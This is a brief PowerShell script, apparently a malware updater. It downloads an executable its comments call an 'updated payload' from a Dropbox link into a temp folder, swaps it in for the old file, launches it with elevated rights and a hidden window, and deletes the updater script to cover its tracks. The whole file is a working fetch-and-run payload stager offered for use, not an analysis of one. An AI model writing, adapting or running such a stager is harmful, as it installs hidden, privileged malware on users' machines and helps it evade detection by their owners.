#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/bhb8pi9rfq842p65huhm1/wsappa-1.2.exe?rlkey=irp8lxs94i02sjm59z6vjt4vq&dl=0" -OutFile new_wsappa.exe

#remove old payload
remove-item wsappa.exe

#change name
rename-item new_wsappa.exe wsappa.exe

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
